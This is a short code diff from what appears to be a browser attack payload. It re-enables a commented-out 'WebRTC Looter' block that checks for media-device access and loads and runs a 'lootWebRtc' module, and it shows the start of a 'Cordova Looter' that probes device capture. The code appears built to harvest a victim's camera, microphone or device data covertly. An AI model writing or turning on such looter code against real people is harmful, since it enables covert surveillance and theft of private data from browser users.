@@ -68,12 +68,12 @@ function __ld_main() {
     }
 
     // WebRTC Looter
-    // if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
-    //     console.log('WebRTC looks to be accessible');
-    //     requirejs(['lootWebRtc'], function(webrtc) {
-    //         webrtc.execute();
-    //     });
-    // }
+    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+        console.log('WebRTC looks to be accessible');
+        requirejs(['lootWebRtc'], function(webrtc) {
+            webrtc.execute();
+        });
+    }
 
     // Cordova Looter
     if (navigator.device && navigator.device.capture) {
